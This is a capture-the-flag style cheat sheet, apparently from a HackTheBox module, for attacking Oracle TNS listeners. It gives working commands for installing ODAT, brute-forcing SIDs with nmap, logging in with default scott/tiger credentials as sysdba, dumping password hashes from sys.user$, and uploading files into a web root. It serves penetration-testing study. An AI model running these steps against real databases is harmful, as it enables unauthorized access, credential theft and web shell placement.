

## Packages to Install (Before TNS Enumeration)

**Oracle-Tools-setup.sh**

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

## Test Installation (ODAT)

```bash
./odat.py -h
```

Expected banner shows ODAT usage/help.

## Nmap Oracle TNS Scan

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

Example result:

```
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

Notes on `SID` (from your text): Oracle RDBMS uses a System Identifier to select the specific database instance. Incorrect SID causes connection failure. Default may come from `tnsnames.ora`.

## Nmap – SID Bruteforcing

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

Example finding:

```
| oracle-sid-brute: 
|_  XE
```

## ODAT – Enumerate

```bash
./odat.py all -s 10.129.204.235
```

Example output includes:

```
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured.
[+] Valid credentials found: scott/tiger.
```

## SQLplus – Log In (after finding creds)

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

Example:

```
ORA-28002: the password will expire within 7 days
Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

## Error Fix (sqlplus lib)

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

## Interaction with Oracle RDBMS (SQL*Plus)

List tables:

```sql
select table_name from all_tables;
```

Example:

```
DUAL
SYSTEM_PRIVILEGE_MAP
...
```

User role privs:

```sql
select * from user_role_privs;
```

Example:

```
SCOTT  CONNECT  NO YES NO
SCOTT  RESOURCE NO YES NO
```

## As SYSDBA (Database Enumeration)

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

Example `user_role_privs` output shows many roles for `SYS` (truncated in your text).

## Extract Password Hashes

```sql
select name, password from sys.user$;
```

Example (truncated in your text):

```
SYS     FBA343E7D6C8BC9D
SYSTEM  B5073FE1DE351687
OUTLN   4A3BA55E08595C81
...
```

## File Upload (ODAT UTL_FILE)

Prepare file, then upload:

```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Example result shows file created at `C:\inetpub\wwwroot\testing.txt`.

Default web roots (from your text):

- Linux: `/var/www/html`
    
- Windows: `C:\inetpub\wwwroot`
    

## HTB Guide (from your text)

Download instant client, set env, clone `odat`, install deps (as listed).

Enumerate:

```bash
python3 odat.py all -s STMIP
```

Example: find `XE` SID and `scott/tiger`.

Connect as sysdba:

```bash
sqlplus scott/tiger@STMIP/XE as sysdba
```

Retrieve `DBSNMP` hash:

```sql
select name, password from sys.user$ where name = 'DBSNMP';
```

Example:

```
DBSNMP  E066D214D5421CCC
```